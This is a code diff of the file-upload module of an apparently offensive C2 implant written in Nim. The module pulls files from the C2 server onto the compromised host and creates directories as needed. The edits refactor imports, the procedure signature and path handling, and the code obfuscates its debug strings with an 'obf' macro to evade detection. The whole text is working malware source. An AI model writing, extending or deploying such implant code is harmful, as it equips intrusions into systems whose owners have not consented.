@@ -1,11 +1,11 @@
-from ../../core/webClientListener import Listener
-from os import getcurrentdir, `/`
+import ../../core/webClientListener
+from os import getcurrentdir, `/`, parentDir, dirExists, createDir
 from strutils import join, split, toLowerAscii
 from zippy import uncompress
 import ../../util/crypto
-import ../../util/strenc  # Import the module containing the obf macro
 import puppy
 import base64
+from ../../util/strenc import obf
 
 # Upload a file from the C2 server to the Implant
 # From Implant's perspective this is similar to wget, but calling to the C2 server instead
@@ -24,7 +24,7 @@ import base64
 #
 # Note: The server should ALWAYS provide the X-Original-Filename header.
 # If the header is missing, it indicates a potential security issue or server misconfiguration.
-proc upload*(li : Listener, cmdGuid : string, args : varargs[string]) : string =
+proc upload*(li : webClientListener.Listener, cmdGuid : string, args : seq[string]) : string =
     var 
         fileId : string
         url : string
@@ -85,16 +85,16 @@ proc upload*(li : Listener, cmdGuid : string, args : varargs[string]) : string =
         finalPath = serverFilename
         
         # If path is not absolute, prefix with current directory
-        if not (finalPath.startsWith("/") or (finalPath.len >= 2 and finalPath[1] == ':')):
+        if not (finalPath.len > 0 and finalPath[0] == '/') and not (finalPath.len >= 2 and finalPath[1] == ':'):
             finalPath = getCurrentDir() / serverFilename
             
         echo obf("DEBUG Upload: Final path for file: ") & finalPath
         
         # Ensure directory exists
         try:
-            let dirPath = os.parentDir(finalPath)
-            if dirPath != "" and not os.dirExists(dirPath):
-                os.createDir(dirPath)
+            let dirPath = parentDir(finalPath)
+            if dirPath != "" and not dirExists(dirPath):
+                createDir(dirPath)
         except:
             echo obf("DEBUG Upload: Warning - Could not create parent directories")
             
